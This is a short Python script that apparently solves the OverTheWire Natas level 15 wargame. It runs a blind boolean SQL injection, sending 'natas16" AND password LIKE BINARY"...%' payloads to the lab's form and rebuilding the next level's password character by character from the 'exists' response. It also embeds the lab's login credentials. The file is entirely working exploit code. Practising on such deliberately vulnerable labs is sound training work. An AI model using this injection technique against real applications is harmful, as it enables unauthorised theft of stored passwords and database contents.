import requests
from requests.auth import HTTPBasicAuth

user = "natas15"
pw = "AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J"

# Empty container for our final password
hacc = ""

# Set of all alphanumeric characters
chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

while (len(hacc) < 32):
    for char in chars:
        exploit = {
            "username": f'natas16" AND password LIKE BINARY"{hacc + char}%'
        }
        print(exploit)
        r = requests.post('http://natas15.natas.labs.overthewire.org/?debug', data=exploit, auth=HTTPBasicAuth(user, pw))

        if 'exists' in r.text:
            hacc += char
            print(hacc)
            break